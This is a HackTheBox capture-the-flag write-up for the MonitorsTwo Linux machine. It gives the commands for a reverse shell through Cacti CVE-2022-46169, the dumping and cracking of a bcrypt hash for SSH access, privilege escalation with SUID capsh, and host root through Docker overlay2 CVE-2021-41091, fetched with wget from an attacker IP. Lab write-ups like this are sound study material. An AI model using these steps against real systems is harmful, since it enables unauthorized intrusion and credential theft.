# HackTheBox — MonitorsTwo

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Tags: cacti, cve, docker, overlay2](https://img.shields.io/badge/Tags-Cacti%20%7C%20CVE%20%7C%20Docker%20%7C%20overlay2-orange)

> **TL;DR** — Cacti 1.2.22 on port 80 is vulnerable to **CVE-2022-46169** (unauthenticated command injection); land a `www-data` shell inside a Docker container. Read `/entrypoint.sh` to recover MySQL creds, dump the `user_auth` table, and crack `marcus`'s bcrypt hash with `rockyou` → `funkymonkey`. SSH to the host as `marcus` for `user.txt`. Back inside the container, abuse SUID `capsh` (GTFOBins) to become root *in the container*, then exploit **CVE-2021-41091** — the host's `overlay2` directories preserve the container's SUID bits — to execute that SUID `bash` from `marcus`'s shell on the host and land root.

---

## Attack Chain at a Glance

```
nmap → Cacti 1.2.22 → CVE-2022-46169 → www-data INSIDE a container
   → /entrypoint.sh → MySQL root:root → user_auth.marcus bcrypt
   → hashcat → funkymonkey
   → SSH marcus@host → user.txt
   → SUID capsh in container → root INSIDE container
   → chmod u+s /bin/bash (container)
   → CVE-2021-41091 from host → run container's SUID bash via overlay2 → root.txt
```

The trick on this box is that **the path from `marcus` (host) to root crosses the container/host boundary twice**: we get root *inside* the container first, then leverage how Docker's overlay2 driver shares files with the host to land root on the host itself.

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Foothold — CVE-2022-46169](#initial-foothold--cve-2022-46169)
- [Container Awareness](#container-awareness)
- [Database Enumeration](#database-enumeration)
- [User Flag — Cracking and SSH as marcus](#user-flag--cracking-and-ssh-as-marcus)
- [Container Root — SUID capsh](#container-root--suid-capsh)
- [Host Root — CVE-2021-41091 via overlay2](#host-root--cve-2021-41091-via-overlay2)
- [Root Flag](#root-flag)
- [Lessons Learned](#lessons-learned)
- [Tools Referenced](#tools-referenced)

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -Pn -p- --min-rate=5000 -oN nmap.txt 10.10.11.211
```

<details>
<summary>Click to expand full output</summary>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

</details>

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | nginx fronting Cacti — login page advertises **Cacti v1.2.22** |

The version is the whole story here. Cacti 1.2.22 is vulnerable to **CVE-2022-46169** out of the box.

---

## Initial Foothold — CVE-2022-46169

### The Vulnerability

Cacti's `remote_agent.php` performs an authorization check based on the client IP — but the check accepts the `X-Forwarded-For` header *before* validating it. By spoofing `X-Forwarded-For: 127.0.0.1`, you bypass auth, and from there a `host_id` parameter is concatenated into a `proc_open()` call without sanitization → unauthenticated RCE.

### Exploitation

[FredBrave's PoC](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22) automates the bypass and reverse shell:

```bash
python3 CVE-2022-46169.py -u http://10.10.11.211 -lh 10.10.14.4 -lp 4444
```

Catch the shell:

```bash
nc -lvnp 4444
# connect to [10.10.14.4] from (UNKNOWN) [10.10.11.211] ...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Stabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Container Awareness

Two tells that this isn't the host:

```bash
www-data@50bca5e748b0:/$ cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
... (system users only) ...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

**No human users.** No `marcus`, no `frank`, no anyone. On a real machine you'd expect at least one. Combined with the hostname being a 12-character hex string (`50bca5e748b0` — Docker's container ID format), we're clearly inside a container.

The second tell is in the root of `/`:

```bash
www-data@50bca5e748b0:/$ ls /
... bin boot dev entrypoint.sh etc ...
```

`entrypoint.sh` at `/` is a Docker convention. Containers are usually launched with `ENTRYPOINT ["/entrypoint.sh"]` to bootstrap the service before handing off to the main process.

---

## Database Enumeration

### Reading entrypoint.sh

```bash
cat /entrypoint.sh
```

```bash
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
fi
...
```

Two gifts:

1. **MySQL is on a separate container** (`--host=db`) — there's a multi-container Compose setup on this host.
2. **Root creds are in plaintext** (`--user=root --password=root`).

### Dumping user_auth

```bash
mysql --host=db --user=root --password=root cacti -e "select id, username, password from user_auth"
```

| id | username | password |
|----|----------|----------|
| 1  | admin    | `$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC` |
| 3  | guest    | `43e9a4ab75570f5b` |
| 4  | marcus   | `$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C` |

Both `admin` and `marcus` are bcrypt (`$2y$10$...`). Bcrypt with cost 10 is slow to crack — try `marcus` first since the username matches a real human and the "Marcus Brune" full_name in the table looks like an SSH-able account.

---

## User Flag — Cracking and SSH as marcus

### Hashcat

```bash
echo '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C' > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

> 💡 **Hashcat mode 3200 is bcrypt.** It's slow by design — single-GPU rates are typically a few thousand hashes per second. If `rockyou` doesn't crack it in a reasonable time, move on; bcrypt with a non-dictionary password isn't worth grinding on.

### SSH (to the host, not the container)

```bash
ssh marcus@10.10.11.211
# password: funkymonkey

marcus@monitorstwo:~$ cat user.txt
```

🚩 **User flag captured.** Note that this SSH lands us on the **host**, not the container — the container only exposed 80 internally, while the host exposed 22.

---

## Container Root — SUID capsh

We're now juggling **two shells**:

| Shell | Where | As whom |
|-------|-------|---------|
| Reverse shell from CVE-2022-46169 | Inside Cacti container | `www-data` |
| New SSH session | Host | `marcus` |

### Finding the Privesc Path in the Container

```bash
www-data@50bca5e748b0:/$ find / -perm /4000 -type f 2>/dev/null
```

```
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh         # ← unusual
/bin/mount
/bin/umount
/bin/su
```

`capsh` shouldn't normally be SUID. [GTFOBins entry](https://gtfobins.github.io/gtfobins/capsh/) explains the exploit:

```bash
www-data@50bca5e748b0:/$ /sbin/capsh --gid=0 --uid=0 --
root@50bca5e748b0:/# id
uid=0(root) gid=0(root) groups=0(root)
```

We're root **inside the container**. From here we can read/modify any file in the container — but `root.txt` lives on the host, not in here.

### Setting Up the Pivot

The next stage needs a SUID `bash` inside the container:

```bash
root@50bca5e748b0:/# chmod u+s /bin/bash
root@50bca5e748b0:/# ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 ... /bin/bash
```

Why this matters: Docker's `overlay2` storage driver layers container filesystems on top of the host's filesystem. The SUID bit we just set on `/bin/bash` inside the container is **also stored, with the SUID bit intact, in `/var/lib/docker/overlay2/<id>/diff/bin/bash` on the host**.

If `marcus` on the host can read that path and execute the binary, the kernel honors the SUID bit and gives him a root shell. That's CVE-2021-41091.

---

## Host Root — CVE-2021-41091 via overlay2

### The Vulnerability

[CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091): Docker on certain versions left `/var/lib/docker` world-traversable, meaning any user on the host could descend into the per-container `overlay2` directories and execute SUID binaries created inside containers.

### Running the Exploit

On `marcus`'s SSH session (the **host** shell):

```bash
marcus@monitorstwo:~$ wget http://10.10.14.4/exploit.sh   # or paste in via heredoc
marcus@monitorstwo:~$ chmod +x exploit.sh
marcus@monitorstwo:~$ ./exploit.sh
```

```
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)
Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes

[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ec.../merged
/var/lib/docker/overlay2/c41d585.../merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ec.../merged
[x] Could not get root access in '...'

[?] Checking path: /var/lib/docker/overlay2/c41d585.../merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d585.../merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1#
```

The exploit iterated through both running containers' overlay2 paths (the Cacti container *and* the MySQL container) and found ours — the one where we'd just SUID'd `bash`.

If the auto-spawned shell drops you back to `marcus`, run it manually:

```bash
cd /var/lib/docker/overlay2/c41d585.../merged
./bin/bash -p
```

```
bash-5.1# id
uid=1000(marcus) euid=0(root) groups=1000(marcus)
```

---

## Root Flag

```bash
bash-5.1# cat /root/root.txt
475075b997bb9a2cb64935332e3fe122
```

🚩 **Root flag captured.**

---

## Lessons Learned

- **Read `/etc/passwd` for *what's missing*, not just what's there.** A passwd file with no human users is a strong fingerprint of being inside a container.
- **`/entrypoint.sh` and `/docker-entrypoint.sh` at `/` are container giveaways.** They also routinely contain hardcoded service credentials — bootstrap scripts almost always do, because Compose conventions encourage `--user=root --password=root` for internal-network DBs.
- **Containerization moves the attack surface, it doesn't remove it.** A foothold inside a container *plus* SSH access to the host as a different user is a common real-world configuration, and the bridge between them is often the storage driver.
- **Docker overlay2 is the bridge.** Every change inside a container — including SUID bit flips — is stored on the host's filesystem under `/var/lib/docker/overlay2/`. Patched versions correctly block traversal; unpatched versions on real engagements are not rare.
- **Bcrypt with cost ≥10 means: try the obvious wordlists, then move on.** If `rockyou` doesn't hit in 15 minutes, the password isn't in `rockyou`. Don't wait an hour for a CTF; pivot to other enumeration.
- **GTFOBins entries for unusual SUID binaries are the first place to look.** `capsh`, `dd`, `find`, `cp`, `vim` showing up SUID is almost always the intended privesc path.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port and service discovery |
| [CVE-2022-46169 PoC (FredBrave)](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22) | Cacti unauthenticated RCE |
| [`hashcat`](https://hashcat.net/) | Cracking marcus's bcrypt hash (mode `3200`) |
| [GTFOBins — capsh](https://gtfobins.github.io/gtfobins/capsh/) | SUID escalation inside the container |
| [CVE-2021-41091 PoC (UncleJ4ck)](https://github.com/UncleJ4ck/CVE-2021-41091) | Docker overlay2 host escalation |

---

*Thanks for reading — feedback welcome.*
